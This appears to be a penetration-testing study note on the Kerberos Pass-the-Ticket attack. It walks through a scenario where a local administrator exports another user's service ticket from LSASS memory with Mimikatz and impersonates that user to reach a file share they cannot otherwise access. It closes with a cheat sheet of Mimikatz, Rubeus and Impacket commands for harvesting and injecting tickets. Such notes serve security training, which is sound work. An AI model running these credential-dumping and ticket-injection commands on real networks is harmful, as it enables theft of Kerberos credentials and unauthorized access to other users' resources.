public:: true

- If we find a TGS which provides access to domain services (or resources) we currently have no access, then we can try to import it to our active session and use it to **impersonate the user** for which that TGS was generated.
	- Lets pretend we are *Jen*, a local administrator in the *CLIENT76* (a domain joined computer) and we'd like to access the remote folder *\\web04\backup* for which *Jen* has no access.
	  logseq.order-list-type:: number
		- ```cmd
		  C:\Windows\system32> whoami
		  corp\jen
		  C:\Windows\system32> ls \\web04\backup
		  ls : Access to the path '\\web04\backup' is denied.
		  ```
	- Luckily, *Dave* has previously logged in *CLIENT76* and used it to access *\\web04\backup* (for which he has access to).
	  logseq.order-list-type:: number
	- As we know, TGT and TGS are [kept in-memory](((6564d528-7b7b-4d33-b49c-36fe2d615343))) (stored in [LSASS](((65663778-526d-48d4-a36d-3177ea335c2a))) process' memory). So, we can use [[Mimikatz]] to export *Dave*'s TGS for *\\web04\backup* and re-import it into *Jen*'s session.
	  logseq.order-list-type:: number
		- ```mimikatz
		  privilege::debug
		  sekurlsa::tickets /export
		  [...]
		  kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
		  ```
	- At this point we (*Jen*) should be able to access *\\web04\backup* by impersonating *Dave*.
	  logseq.order-list-type:: number
		- ```cmd
		  C:\Tools> ls \\web04\backup
		  
		  Mode                LastWriteTime         Length Name
		  ----                -------------         ------ ----
		  -a----        9/13/2022   2:52 AM              0 backup_schemata.txt
		  ```
- #+BEGIN_TIP
  Please note that successfully exported **TGT can only be used** on the machine it was created for. Instead, **TGS can be imported to a different user's session** on the same computer or moved to elsewhere in the network and **imported in a different computer**.
  #+END_TIP
- #+BEGIN_TIP
  If the service tickets belong to the current user, then **no administrative privileges are required**.
  #+END_TIP
- Generic Pass-The-Ticket commands
	- Harvest tickets
		- With [[Mimikatz]]
		  id:: 656869d9-c249-4f49-9165-bb1034fa8178
			- id:: 65686a95-2f8d-4c16-ba29-4ec6ce616cb4
			  ```
			  > sekurlsa::tickets /export
			  ```
		- With [[Rubeus]]
		  id:: 656869e0-2bb7-4449-868f-abbb5dda4be4
			- ```powershell
			  Rubeus.exe dump
			  ```
			- Since Rubeus returns base64 encoded tickets you can then save them in the **kirbi** format as follow
			  ```powershell
			  [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64_ticket>"))
			  ```
	- Pass tickets to different tools
		- [[Impacket]]
			- ```bash
			  # Set the ticket for impacket use
			  export KRB5CCNAME=<TGT_ccache_file_path>
			  ```
		- [[Mimikatz]]
			- ```
			  > kerberos::ptt <ticket_kirbi_file>
			  ```
		- [[Rubeus]]
			- ```powershell
			  Rubeus.exe ptt /ticket:<ticket_kirbi_file>
			  ```